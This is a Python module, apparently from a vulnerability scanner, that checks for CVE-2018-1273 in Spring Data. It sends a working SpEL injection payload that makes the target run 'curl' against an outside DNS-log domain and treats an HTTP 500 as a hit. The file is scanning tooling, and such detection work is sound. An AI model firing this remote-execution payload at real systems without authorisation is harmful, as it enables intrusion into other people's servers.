#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2018_1273.py
   Description :   CVE-2018-1273 漏洞检测模块，优化会话复用与接口一致性
   Author :       sule01u
   date：          2023/10/25
"""
import random
import requests
from urllib.parse import urljoin
from utils.custom_headers import TIMEOUT, USER_AGENTS
from colorama import Fore
from utils.logging_config import configure_logger

# 初始化日志记录
logger = configure_logger(__name__)

# CVE 编号
CVE_ID = "CVE-2018-1273"

# 常量配置
PAYLOAD = "username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('curl SBSCAN_cve_2018_1273.%s')]=&password=&repeatedPassword="
ENDPOINT = "/users?page=&size=5"

def check(url, dns_domain="", proxy=None, session=None, timeout=TIMEOUT):
    """
    检测 CVE-2018-1273 漏洞
    :param url: 目标 URL
    :param dns_domain: DNS 日志域名
    :param proxy: 代理配置
    :param session: 复用的 Session 实例（可选）
    :param timeout: 请求超时时间（秒）
    :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
    """
    dns_domain = dns_domain or "dnslog.cn"  # 默认使用 dnslog.cn
    target_url = urljoin(url, ENDPOINT)
    payload = PAYLOAD % dns_domain

    headers = {
        'Host': "localhost:8080",
        'Connection': "keep-alive",
        'Content-Length': "120",
        'Pragma': "no-cache",
        'Cache-Control': "no-cache",
        'Origin': "http://localhost:8080",
        'Upgrade-Insecure-Requests': "1",
        'Content-Type': "application/x-www-form-urlencoded",
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        'Referer': "http://localhost:8080/users?page=0&size=5",
        'Accept-Encoding': "gzip, deflate, br",
        'Accept-Language': "zh-CN,zh;q=0.9,en;q=0.8"
    }

    try:
        # 使用传入的 session，如果没有则创建新的 session（用于单独测试时）
        session = session or requests.Session()
        res = session.post(target_url, headers=headers, timeout=timeout, data=payload, verify=False, proxies=proxy)

        logger.debug(Fore.CYAN + f"[{res.status_code}]" + Fore.BLUE + f"[{res.headers}]", extra={"target": target_url})

        # 检查返回的状态码，如果为 500 则表示存在漏洞
        if res.status_code == 500:
            details = f"{CVE_ID} vulnerability detected at {target_url}"
            if dns_domain == "dnslog.cn":
                details += ", use the --dnslog parameter to specify your DNS log domain and then scan again."
            else:
                details += ", please check your DNS log record for confirmation."

            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
            return True, {
                "CVE_ID": CVE_ID,
                "URL": target_url,
                "Details": details
            }

        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
        return False, {}

    except (requests.Timeout, requests.ConnectionError, requests.RequestException) as e:
        logger.error(f"[Request Error：{e}]", extra={"target": target_url})
        return False, {}
    except Exception as e:
        logger.error(f"[Unknown Error：{e}]", extra={"target": target_url})
        return False, {}
    finally:
        # 如果 session 是本模块创建的，则关闭（否则保持复用的 session 不被关闭）
        if not session:
            session.close()


if __name__ == '__main__':
    # 测试用例
    proxy = {"http": "http://user:password@localhost:8080", "https": "http://user:password@localhost:8080"}
    is_vul, res = check("http://localhost:8080/", "xxxxx.eyes.sh", proxy=proxy)
    print(is_vul, res)